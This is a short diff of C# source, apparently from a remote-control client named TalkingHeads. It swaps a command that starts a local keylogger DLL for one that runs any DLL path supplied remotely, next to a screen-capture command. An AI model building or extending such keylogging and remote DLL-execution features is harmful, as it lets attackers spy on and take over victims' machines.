@@ -1,5 +1,4 @@
-﻿using System.IO;
-using System.Net.Sockets;
+﻿using System.Net.Sockets;
 using System.Text;
 using TalkingHeads.Commands;
 
@@ -73,9 +72,8 @@ async Task<string> ExecuteCommand(string command)
             case "screen":
                 WindowsTools.CaptureScreen(args);
                 return "[Not implemented: screenshot]";
-            case "logtext":
-
-                return DLLInvoker.Execute("C:\\Development\\TalkingHeads\\TalkingHeads_Client\\x64\\Release\\Keylogger.dll", "start");
+            case "xdll":
+                return DLLInvoker.Execute(args);
             case "search":
                 //Search state wo man dateien und ordner suchen kann...
                 //Datei oder ornder auswählen und optionen zum bearbeiten...
